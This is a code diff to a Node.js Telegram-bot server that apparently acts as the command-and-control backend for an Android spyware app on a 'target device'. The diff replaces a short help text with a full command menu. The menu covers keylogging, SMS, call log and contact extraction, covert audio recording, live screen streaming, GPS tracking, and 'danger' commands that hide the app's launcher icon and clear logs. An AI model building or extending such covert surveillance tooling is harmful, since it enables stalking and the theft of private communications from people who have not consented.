@@ -213,7 +213,6 @@ app.get('/health', (req, res) => {
     });
 });
 
-// Command handler
 async function handleCommand(chatId, command, messageId) {
     console.log(`🎯 Handling command ${command} from authorized chat ${chatId}`);
     console.log(`📊 Current devices in memory: ${devices.size}`);
@@ -233,7 +232,6 @@ async function handleCommand(chatId, command, messageId) {
     let device = null;
     
     for (const [id, d] of devices.entries()) {
-        console.log(`Checking device ${id} with chat ${d.chatId} against ${chatId}`);
         if (String(d.chatId) === String(chatId)) {
             deviceId = id;
             device = d;
@@ -244,7 +242,6 @@ async function handleCommand(chatId, command, messageId) {
 
     if (!deviceId) {
         console.log(`❌ No device found for chat ${chatId}`);
-        console.log('Current registered chats:', Array.from(devices.values()).map(d => d.chatId).join(', '));
         await sendTelegramMessage(chatId, 
             '❌ No device registered for this chat.\n\n' +
             'Please make sure the Android app is running on your target device.\n' +
@@ -255,15 +252,9 @@ async function handleCommand(chatId, command, messageId) {
     // Update last seen
     device.lastSeen = Date.now();
 
-    // Handle help command directly (doesn't need device)
+    // Handle help command (shows all available commands)
     if (command === '/help' || command === '/start') {
-        await sendTelegramMessage(chatId,
-            '📋 *Available Commands*\n\n' +
-            '*/status* - Get device status\n' +
-            '*/screenshot* - Take a screenshot\n' +
-            '*/location* - Get GPS location\n' +
-            '*/contacts* - Get contact list\n' +
-            '*/help* - Show this menu');
+        await sendTelegramMessage(chatId, getHelpMessage());
         return;
     }
 
@@ -285,6 +276,61 @@ async function handleCommand(chatId, command, messageId) {
 
     // Acknowledge command receipt
     await sendTelegramMessage(chatId, `⏳ Processing: ${command}`);
+}
+
+// Help message with all commands
+function getHelpMessage() {
+    return `📋 *Complete Command List*
+
+*🔍 Monitoring Commands*
+/status - Get full device status
+/location - Get current GPS location
+/battery - Get battery level only
+/storage - Get storage information
+/network - Get network info (IP, WiFi, Mobile)
+
+*📸 Media Commands*
+/screenshot - Take a screenshot
+/record - Start 60s audio recording
+/stream_start - Start live streaming
+/stream_stop - Stop live streaming
+
+*📱 Data Extraction Commands*
+/contacts - Get contact list (up to 100)
+/calllogs - Get recent call logs
+/sms - Get recent SMS messages
+/apps - List installed apps
+/keystrokes - Get recent keystrokes
+/notifications - Get recent notifications
+
+*⚙️ Service Commands*
+/start_screenshot - Start screenshot service
+/stop_screenshot - Stop screenshot service
+/start_recording - Start scheduled recording
+/stop_recording - Stop recording service
+/start_stream - Start streaming service
+/stop_stream - Stop streaming service
+
+*🛠️ Utility Commands*
+/help - Show this help menu
+/ping - Test connection
+/echo [text] - Echo back text
+/time - Get device time
+/info - Get detailed device info
+
+*⚠️ Danger Commands*
+/clear_logs - Clear all logs
+/reboot_app - Restart services
+/hide_icon - Hide launcher icon
+/show_icon - Show launcher icon
+
+*📊 Stats Commands*
+/logs_count - Get total log count
+/logs_recent - Get 10 most recent logs
+/logs_by_type [type] - Get logs by type
+/stats - Get detailed statistics
+
+For more help, visit the dashboard at http://127.0.0.1:8080`;
 }
 
 // Helper to send Telegram messages
